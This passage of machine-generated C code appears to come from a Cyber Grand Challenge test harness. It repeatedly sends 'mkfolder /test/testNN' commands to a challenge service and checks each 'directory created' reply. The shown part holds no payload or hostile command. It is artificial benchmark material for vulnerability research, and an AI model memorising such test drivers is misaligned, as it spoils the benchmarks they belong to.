      unsigned int read_00091_len;
      unsigned int read_00091_ptr = 0;
      //**** delimited read
      static unsigned char read_00091_delim[] = 
         "\x25\x20";
      read_00091 = NULL;
      read_00091_len = 0;
      int read_00091_res = cgc_delimited_read(0, &read_00091, &read_00091_len, read_00091_delim, 2);
      if (read_00091_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00091_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00091_ptr += cgc_data_match(read_00091 + read_00091_ptr, read_00091_len - read_00091_ptr, match_00091_00000, 18);
      cgc_free(read_00091);
      if (read_00091_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00090_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x38\x38\x0a";
      static unsigned int write_00090_00000_len = 22;
      unsigned char *write_00090 = NULL;
      unsigned int write_00090_len = 0;
      write_00090 = cgc_append_buf(write_00090, &write_00090_len, write_00090_00000, write_00090_00000_len);
      if (write_00090_len > 0) {
         cgc_transmit_all(1, write_00090, write_00090_len);
      }
      cgc_free(write_00090);
   } while (0);
   do {
      unsigned char *read_00092;
      unsigned int read_00092_len;
      unsigned int read_00092_ptr = 0;
      //**** delimited read
      static unsigned char read_00092_delim[] = 
         "\x25\x20";
      read_00092 = NULL;
      read_00092_len = 0;
      int read_00092_res = cgc_delimited_read(0, &read_00092, &read_00092_len, read_00092_delim, 2);
      if (read_00092_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00092_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00092_ptr += cgc_data_match(read_00092 + read_00092_ptr, read_00092_len - read_00092_ptr, match_00092_00000, 18);
      cgc_free(read_00092);
      if (read_00092_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00091_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x38\x39\x0a";
      static unsigned int write_00091_00000_len = 22;
      unsigned char *write_00091 = NULL;
      unsigned int write_00091_len = 0;
      write_00091 = cgc_append_buf(write_00091, &write_00091_len, write_00091_00000, write_00091_00000_len);
      if (write_00091_len > 0) {
         cgc_transmit_all(1, write_00091, write_00091_len);
      }
      cgc_free(write_00091);
   } while (0);
   do {
      unsigned char *read_00093;
      unsigned int read_00093_len;
      unsigned int read_00093_ptr = 0;
      //**** delimited read
      static unsigned char read_00093_delim[] = 
         "\x25\x20";
      read_00093 = NULL;
      read_00093_len = 0;
      int read_00093_res = cgc_delimited_read(0, &read_00093, &read_00093_len, read_00093_delim, 2);
      if (read_00093_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00093_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00093_ptr += cgc_data_match(read_00093 + read_00093_ptr, read_00093_len - read_00093_ptr, match_00093_00000, 18);
      cgc_free(read_00093);
      if (read_00093_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00092_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x39\x30\x0a";
      static unsigned int write_00092_00000_len = 22;
      unsigned char *write_00092 = NULL;
      unsigned int write_00092_len = 0;
      write_00092 = cgc_append_buf(write_00092, &write_00092_len, write_00092_00000, write_00092_00000_len);
      if (write_00092_len > 0) {
         cgc_transmit_all(1, write_00092, write_00092_len);
      }
      cgc_free(write_00092);
   } while (0);
   do {
      unsigned char *read_00094;
      unsigned int read_00094_len;
      unsigned int read_00094_ptr = 0;
      //**** delimited read
      static unsigned char read_00094_delim[] = 
         "\x25\x20";
      read_00094 = NULL;
      read_00094_len = 0;
      int read_00094_res = cgc_delimited_read(0, &read_00094, &read_00094_len, read_00094_delim, 2);
      if (read_00094_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00094_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00094_ptr += cgc_data_match(read_00094 + read_00094_ptr, read_00094_len - read_00094_ptr, match_00094_00000, 18);
      cgc_free(read_00094);
      if (read_00094_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00093_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x39\x31\x0a";
      static unsigned int write_00093_00000_len = 22;
      unsigned char *write_00093 = NULL;
      unsigned int write_00093_len = 0;
      write_00093 = cgc_append_buf(write_00093, &write_00093_len, write_00093_00000, write_00093_00000_len);
      if (write_00093_len > 0) {
         cgc_transmit_all(1, write_00093, write_00093_len);
      }
      cgc_free(write_00093);
   } while (0);
   do {
      unsigned char *read_00095;
      unsigned int read_00095_len;
      unsigned int read_00095_ptr = 0;
      //**** delimited read
      static unsigned char read_00095_delim[] = 
         "\x25\x20";
      read_00095 = NULL;
      read_00095_len = 0;
      int read_00095_res = cgc_delimited_read(0, &read_00095, &read_00095_len, read_00095_delim, 2);
      if (read_00095_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00095_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00095_ptr += cgc_data_match(read_00095 + read_00095_ptr, read_00095_len - read_00095_ptr, match_00095_00000, 18);
      cgc_free(read_00095);
      if (read_00095_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00094_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x39\x32\x0a";
      static unsigned int write_00094_00000_len = 22;
      unsigned char *write_00094 = NULL;
      unsigned int write_00094_len = 0;
      write_00094 = cgc_append_buf(write_00094, &write_00094_len, write_00094_00000, write_00094_00000_len);
      if (write_00094_len > 0) {
         cgc_transmit_all(1, write_00094, write_00094_len);
      }
      cgc_free(write_00094);
   } while (0);
   do {
      unsigned char *read_00096;
      unsigned int read_00096_len;
      unsigned int read_00096_ptr = 0;
      //**** delimited read
      static unsigned char read_00096_delim[] = 
         "\x25\x20";
      read_00096 = NULL;
      read_00096_len = 0;
      int read_00096_res = cgc_delimited_read(0, &read_00096, &read_00096_len, read_00096_delim, 2);
      if (read_00096_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00096_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00096_ptr += cgc_data_match(read_00096 + read_00096_ptr, read_00096_len - read_00096_ptr, match_00096_00000, 18);
      cgc_free(read_00096);
      if (read_00096_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00095_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x39\x33\x0a";
      static unsigned int write_00095_00000_len = 22;
      unsigned char *write_00095 = NULL;
      unsigned int write_00095_len = 0;
      write_00095 = cgc_append_buf(write_00095, &write_00095_len, write_00095_00000, write_00095_00000_len);
      if (write_00095_len > 0) {
         cgc_transmit_all(1, write_00095, write_00095_len);
      }
      cgc_free(write_00095);
   } while (0);
   do {
      unsigned char *read_00097;
      unsigned int read_00097_len;
      unsigned int read_00097_ptr = 0;
      //**** delimited read
      static unsigned char read_00097_delim[] = 
         "\x25\x20";
      read_00097 = NULL;
      read_00097_len = 0;
      int read_00097_res = cgc_delimited_read(0, &read_00097, &read_00097_len, read_00097_delim, 2);
      if (read_00097_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00097_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00097_ptr += cgc_data_match(read_00097 + read_00097_ptr, read_00097_len - read_00097_ptr, match_00097_00000, 18);
      cgc_free(read_00097);
      if (read_00097_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00096_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x39\x34\x0a";
      static unsigned int write_00096_00000_len = 22;
      unsigned char *write_00096 = NULL;
      unsigned int write_00096_len = 0;
      write_00096 = cgc_append_buf(write_00096, &write_00096_len, write_00096_00000, write_00096_00000_len);
      if (write_00096_len > 0) {
         cgc_transmit_all(1, write_00096, write_00096_len);
      }
      cgc_free(write_00096);
   } while (0);
   do {
      unsigned char *read_00098;
      unsigned int read_00098_len;
      unsigned int read_00098_ptr = 0;
      //**** delimited read
      static unsigned char read_00098_delim[] = 
         "\x25\x20";
      read_00098 = NULL;
      read_00098_len = 0;
      int read_00098_res = cgc_delimited_read(0, &read_00098, &read_00098_len, read_00098_delim, 2);
      if (read_00098_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00098_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00098_ptr += cgc_data_match(read_00098 + read_00098_ptr, read_00098_len - read_00098_ptr, match_00098_00000, 18);
      cgc_free(read_00098);
      if (read_00098_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00097_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x39\x35\x0a";
      static unsigned int write_00097_00000_len = 22;
      unsigned char *write_00097 = NULL;
      unsigned int write_00097_len = 0;
      write_00097 = cgc_append_buf(write_00097, &write_00097_len, write_00097_00000, write_00097_00000_len);
      if (write_00097_len > 0) {
         cgc_transmit_all(1, write_00097, write_00097_len);
      }
      cgc_free(write_00097);
   } while (0);
   do {
      unsigned char *read_00099;
      unsigned int read_00099_len;
      unsigned int read_00099_ptr = 0;
      //**** delimited read
      static unsigned char read_00099_delim[] = 
         "\x25\x20";
      read_00099 = NULL;
      read_00099_len = 0;
      int read_00099_res = cgc_delimited_read(0, &read_00099, &read_00099_len, read_00099_delim, 2);
      if (read_00099_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00099_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00099_ptr += cgc_data_match(read_00099 + read_00099_ptr, read_00099_len - read_00099_ptr, match_00099_00000, 18);
      cgc_free(read_00099);
      if (read_00099_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00098_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x39\x36\x0a";
      static unsigned int write_00098_00000_len = 22;
      unsigned char *write_00098 = NULL;
      unsigned int write_00098_len = 0;
      write_00098 = cgc_append_buf(write_00098, &write_00098_len, write_00098_00000, write_00098_00000_len);
      if (write_00098_len > 0) {
         cgc_transmit_all(1, write_00098, write_00098_len);
      }
      cgc_free(write_00098);
   } while (0);
   do {
      unsigned char *read_00100;
      unsigned int read_00100_len;
      unsigned int read_00100_ptr = 0;
      //**** delimited read
      static unsigned char read_00100_delim[] = 
         "\x25\x20";
      read_00100 = NULL;
      read_00100_len = 0;
      int read_00100_res = cgc_delimited_read(0, &read_00100, &read_00100_len, read_00100_delim, 2);
      if (read_00100_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00100_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00100_ptr += cgc_data_match(read_00100 + read_00100_ptr, read_00100_len - read_00100_ptr, match_00100_00000, 18);
      cgc_free(read_00100);
      if (read_00100_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00099_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x39\x37\x0a";
      static unsigned int write_00099_00000_len = 22;
      unsigned char *write_00099 = NULL;
      unsigned int write_00099_len = 0;
      write_00099 = cgc_append_buf(write_00099, &write_00099_len, write_00099_00000, write_00099_00000_len);
      if (write_00099_len > 0) {
         cgc_transmit_all(1, write_00099, write_00099_len);
      }
      cgc_free(write_00099);
   } while (0);
   do {
      unsigned char *read_00101;
      unsigned int read_00101_len;
      unsigned int read_00101_ptr = 0;
      //**** delimited read
      static unsigned char read_00101_delim[] = 
         "\x25\x20";
      read_00101 = NULL;
      read_00101_len = 0;
      int read_00101_res = cgc_delimited_read(0, &read_00101, &read_00101_len, read_00101_delim, 2);
      if (read_00101_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00101_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00101_ptr += cgc_data_match(read_00101 + read_00101_ptr, read_00101_len - read_00101_ptr, match_00101_00000, 18);
      cgc_free(read_00101);
      if (read_00101_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00100_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x39\x38\x0a";
      static unsigned int write_00100_00000_len = 22;
      unsigned char *write_00100 = NULL;
      unsigned int write_00100_len = 0;
      write_00100 = cgc_append_buf(write_00100, &write_00100_len, write_00100_00000, write_00100_00000_len);
      if (write_00100_len > 0) {
         cgc_transmit_all(1, write_00100, write_00100_len);
      }
      cgc_free(write_00100);
   } while (0);
   do {
      unsigned char *read_00102;
      unsigned int read_00102_len;
      unsigned int read_00102_ptr = 0;
      //**** delimited read
      static unsigned char read_00102_delim[] = 
         "\x25\x20";
      read_00102 = NULL;
      read_00102_len = 0;
      int read_00102_res = cgc_delimited_read(0, &read_00102, &read_00102_len, read_00102_delim, 2);
      if (read_00102_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00102_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00102_ptr += cgc_data_match(read_00102 + read_00102_ptr, read_00102_len - read_00102_ptr, match_00102_00000, 18);
      cgc_free(read_00102);
      if (read_00102_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00101_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x39\x39\x0a";
      static unsigned int write_00101_00000_len = 22;
      unsigned char *write_00101 = NULL;
      unsigned int write_00101_len = 0;
      write_00101 = cgc_append_buf(write_00101, &write_00101_len, write_00101_00000, write_00101_00000_len);
      if (write_00101_len > 0) {
         cgc_transmit_all(1, write_00101, write_00101_len);
      }
      cgc_free(write_00101);
   } while (0);
   do {
      unsigned char *read_00103;
      unsigned int read_00103_len;
      unsigned int read_00103_ptr = 0;
      //**** delimited read
      static unsigned char read_00103_delim[] = 
         "\x25\x20";
      read_00103 = NULL;
      read_00103_len = 0;
      int read_00103_res = cgc_delimited_read(0, &read_00103, &read_00103_len, read_00103_delim, 2);
      if (read_00103_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00103_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00103_ptr += cgc_data_match(read_00103 + read_00103_ptr, read_00103_len - read_00103_ptr, match_00103_00000, 18);
      cgc_free(read_00103);
      if (read_00103_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00102_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x31\x30\x30\x0a";
      static unsigned int write_00102_00000_len = 23;
      unsigned char *write_00102 = NULL;
      unsigned int write_00102_len = 0;
      write_00102 = cgc_append_buf(write_00102, &write_00102_len, write_00102_00000, write_00102_00000_len);
      if (write_00102_len > 0) {
         cgc_transmit_all(1, write_00102, write_00102_len);
      }
      cgc_free(write_00102);
   } while (0);
   do {
      unsigned char *read_00104;
      unsigned int read_00104_len;
      unsigned int read_00104_ptr = 0;
      //**** delimited read
      static unsigned char read_00104_delim[] = 
         "\x25\x20";
      read_00104 = NULL;
      read_00104_len = 0;
      int read_00104_res = cgc_delimited_read(0, &read_00104, &read_00104_len, read_00104_delim, 2);
      if (read_00104_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00104_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00104_ptr += cgc_data_match(read_00104 + read_00104_ptr, read_00104_len - read_00104_ptr, match_00104_00000, 18);
      cgc_free(read_00104);
      if (read_00104_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00103_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x31\x30\x31\x0a";
      static unsigned int write_00103_00000_len = 23;
      unsigned char *write_00103 = NULL;
      unsigned int write_00103_len = 0;
      write_00103 = cgc_append_buf(write_00103, &write_00103_len, write_00103_00000, write_00103_00000_len);
      if (write_00103_len > 0) {
         cgc_transmit_all(1, write_00103, write_00103_len);
      }
      cgc_free(write_00103);
   } while (0);
   do {
      unsigned char *read_00105;
      unsigned int read_00105_len;
      unsigned int read_00105_ptr = 0;
      //**** delimited read
      static unsigned char read_00105_delim[] = 
         "\x25\x20";
      read_00105 = NULL;
      read_00105_len = 0;
      int read_00105_res = cgc_delimited_read(0, &read_00105, &read_00105_len, read_00105_delim, 2);
      if (read_00105_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00105_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00105_ptr += cgc_data_match(read_00105 + read_00105_ptr, read_00105_len - read_00105_ptr, match_00105_00000, 18);
      cgc_free(read_00105);
      if (read_00105_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00104_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x31\x30\x32\x0a";
      static unsigned int write_00104_00000_len = 23;
      unsigned char *write_00104 = NULL;
      unsigned int write_00104_len = 0;
      write_00104 = cgc_append_buf(write_00104, &write_00104_len, write_00104_00000, write_00104_00000_len);
      if (write_00104_len > 0) {
         cgc_transmit_all(1, write_00104, write_00104_len);
      }
      cgc_free(write_00104);
   } while (0);
   do {
      unsigned char *read_00106;
      unsigned int read_00106_len;
      unsigned int read_00106_ptr = 0;
      //**** delimited read
      static unsigned char read_00106_delim[] = 
         "\x25\x20";
      read_00106 = NULL;
      read_00106_len = 0;
      int read_00106_res = cgc_delimited_read(0, &read_00106, &read_00106_len, read_00106_delim, 2);
      if (read_00106_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00106_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00106_ptr += cgc_data_match(read_00106 + read_00106_ptr, read_00106_len - read_00106_ptr, match_00106_00000, 18);
      cgc_free(read_00106);
      if (read_00106_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00105_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x31\x30\x33\x0a";
      static unsigned int write_00105_00000_len = 23;
      unsigned char *write_00105 = NULL;
      unsigned int write_00105_len = 0;
      write_00105 = cgc_append_buf(write_00105, &write_00105_len, write_00105_00000, write_00105_00000_len);
      if (write_00105_len > 0) {
         cgc_transmit_all(1, write_00105, write_00105_len);
      }
      cgc_free(write_00105);
   } while (0);
   do {
      unsigned char *read_00107;
      unsigned int read_00107_len;
      unsigned int read_00107_ptr = 0;
      //**** delimited read
      static unsigned char read_00107_delim[] = 
         "\x25\x20";
      read_00107 = NULL;
      read_00107_len = 0;
      int read_00107_res = cgc_delimited_read(0, &read_00107, &read_00107_len, read_00107_delim, 2);
      if (read_00107_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00107_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00107_ptr += cgc_data_match(read_00107 + read_00107_ptr, read_00107_len - read_00107_ptr, match_00107_00000, 18);
      cgc_free(read_00107);
      if (read_00107_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00106_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x31\x30\x34\x0a";
      static unsigned int write_00106_00000_len = 23;
      unsigned char *write_00106 = NULL;
      unsigned int write_00106_len = 0;
      write_00106 = cgc_append_buf(write_00106, &write_00106_len, write_00106_00000, write_00106_00000_len);
      if (write_00106_len > 0) {
         cgc_transmit_all(1, write_00106, write_00106_len);
      }
      cgc_free(write_00106);
   } while (0);
   do {
      unsigned char *read_00108;
      unsigned int read_00108_len;
      unsigned int read_00108_ptr = 0;
      //**** delimited read
      static unsigned char read_00108_delim[] = 
         "\x25\x20";
      read_00108 = NULL;
      read_00108_len = 0;
      int read_00108_res = cgc_delimited_read(0, &read_00108, &read_00108_len, read_00108_delim, 2);
      if (read_00108_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00108_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00108_ptr += cgc_data_match(read_00108 + read_00108_ptr, read_00108_len - read_00108_ptr, match_00108_00000, 18);
      cgc_free(read_00108);
      if (read_00108_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00107_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x31\x30\x35\x0a";
      static unsigned int write_00107_00000_len = 23;
      unsigned char *write_00107 = NULL;
      unsigned int write_00107_len = 0;
      write_00107 = cgc_append_buf(write_00107, &write_00107_len, write_00107_00000, write_00107_00000_len);
      if (write_00107_len > 0) {
         cgc_transmit_all(1, write_00107, write_00107_len);
      }
      cgc_free(write_00107);
   } while (0);
   do {
      unsigned char *read_00109;
      unsigned int read_00109_len;
      unsigned int read_00109_ptr = 0;
      //**** delimited read
      static unsigned char read_00109_delim[] = 
         "\x25\x20";
      read_00109 = NULL;
      read_00109_len = 0;
      int read_00109_res = cgc_delimited_read(0, &read_00109, &read_00109_len, read_00109_delim, 2);
      if (read_00109_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00109_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00109_ptr += cgc_data_match(read_00109 + read_00109_ptr, read_00109_len - read_00109_ptr, match_00109_00000, 18);
      cgc_free(read_00109);
      if (read_00109_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00108_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x31\x30\x36\x0a";
      static unsigned int write_00108_00000_len = 23;
      unsigned char *write_00108 = NULL;
      unsigned int write_00108_len = 0;
      write_00108 = cgc_append_buf(write_00108, &write_00108_len, write_00108_00000, write_00108_00000_len);
      if (write_00108_len > 0) {
         cgc_transmit_all(1, write_00108, write_00108_len);
      }
      cgc_free(write_00108);
   } while (0);
   do {
      unsigned char *read_00110;
      unsigned int read_00110_len;
      unsigned int read_00110_ptr = 0;
      //**** delimited read
      static unsigned char read_00110_delim[] = 
         "\x25\x20";
      read_00110 = NULL;
      read_00110_len = 0;
      int read_00110_res = cgc_delimited_read(0, &read_00110, &read_00110_len, read_00110_delim, 2);
      if (read_00110_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00110_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00110_ptr += cgc_data_match(read_00110 + read_00110_ptr, read_00110_len - read_00110_ptr, match_00110_00000, 18);
      cgc_free(read_00110);
      if (read_00110_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00109_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x31\x30\x37\x0a";
      static unsigned int write_00109_00000_len = 23;
      unsigned char *write_00109 = NULL;
      unsigned int write_00109_len = 0;
      write_00109 = cgc_append_buf(write_00109, &write_00109_len, write_00109_00000, write_00109_00000_len);
      if (write_00109_len > 0) {
         cgc_transmit_all(1, write_00109, write_00109_len);
      }
      cgc_free(write_00109);
   } while (0);
   do {
      unsigned char *read_00111;
      unsigned int read_00111_len;
      unsigned int read_00111_ptr = 0;
      //**** delimited read
      static unsigned char read_00111_delim[] = 
         "\x25\x20";
      read_00111 = NULL;
      read_00111_len = 0;
      int read_00111_res = cgc_delimited_read(0, &read_00111, &read_00111_len, read_00111_delim, 2);
      if (read_00111_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00111_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00111_ptr += cgc_data_match(read_00111 + read_00111_ptr, read_00111_len - read_00111_ptr, match_00111_00000, 18);
      cgc_free(read_00111);
      if (read_00111_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00110_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x31\x30\x38\x0a";
      static unsigned int write_00110_00000_len = 23;
      unsigned char *write_00110 = NULL;
      unsigned int write_00110_len = 0;
      write_00110 = cgc_append_buf(write_00110, &write_00110_len, write_00110_00000, write_00110_00000_len);
      if (write_00110_len > 0) {
         cgc_transmit_all(1, write_00110, write_00110_len);
      }
      cgc_free(write_00110);
   } while (0);
   do {
      unsigned char *read_00112;
      unsigned int read_00112_len;
      unsigned int read_00112_ptr = 0;
      //**** delimited read
      static unsigned char read_00112_delim[] = 
         "\x25\x20";
      read_00112 = NULL;
      read_00112_len = 0;
      int read_00112_res = cgc_delimited_read(0, &read_00112, &read_00112_len, read_00112_delim, 2);
      if (read_00112_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00112_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00112_ptr += cgc_data_match(read_00112 + read_00112_ptr, read_00112_len - read_00112_ptr, match_00112_00000, 18);
      cgc_free(read_00112);
      if (read_00112_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00111_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x31\x30\x39\x0a";
      static unsigned int write_00111_00000_len = 23;
      unsigned char *write_00111 = NULL;
      unsigned int write_00111_len = 0;
      write_00111 = cgc_append_buf(write_00111, &write_00111_len, write_00111_00000, write_00111_00000_len);
      if (write_00111_len > 0) {
         cgc_transmit_all(1, write_00111, write_00111_len);
      }
      cgc_free(write_00111);
   } while (0);
   do {
      unsigned char *read_00113;
      unsigned int read_00113_len;
      unsigned int read_00113_ptr = 0;
      //**** delimited read
      static unsigned char read_00113_delim[] = 
         "\x25\x20";
      read_00113 = NULL;
      read_00113_len = 0;
      int read_00113_res = cgc_delimited_read(0, &read_00113, &read_00113_len, read_00113_delim, 2);
      if (read_00113_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00113_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00113_ptr += cgc_data_match(read_00113 + read_00113_ptr, read_00113_len - read_00113_ptr, match_00113_00000, 18);
      cgc_free(read_00113);
      if (read_00113_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00112_00000[] = 
